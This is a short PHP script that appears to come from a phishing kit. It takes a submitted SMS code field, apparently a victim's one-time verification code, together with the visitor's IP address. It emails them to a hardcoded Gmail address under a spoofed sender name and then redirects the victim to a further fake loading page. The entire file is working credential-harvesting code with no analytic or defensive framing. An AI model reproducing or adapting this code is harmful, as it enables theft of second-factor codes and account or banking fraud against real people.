<?php

session_start();
error_reporting(0);
$ip = $_SERVER['REMOTE_ADDR'];
$email='csssjs99@gmail.com';
$message .= "|----------------[Payload]----------------|\n";
$message .= "==========================\n";
$message .= "               SMS 2  : ".$_POST['sms2']."\n";
$message .= "==========================\n";
$message .= "|----------------[Payload]----------------|\n";
$subject = "SMS 2 FROM THIS IP:  $ip";
$headers = "From: Χάρων <info@online.net>";
mail("$email", "$subject", "$message", "$headers");


header('location:./load3.html');
?>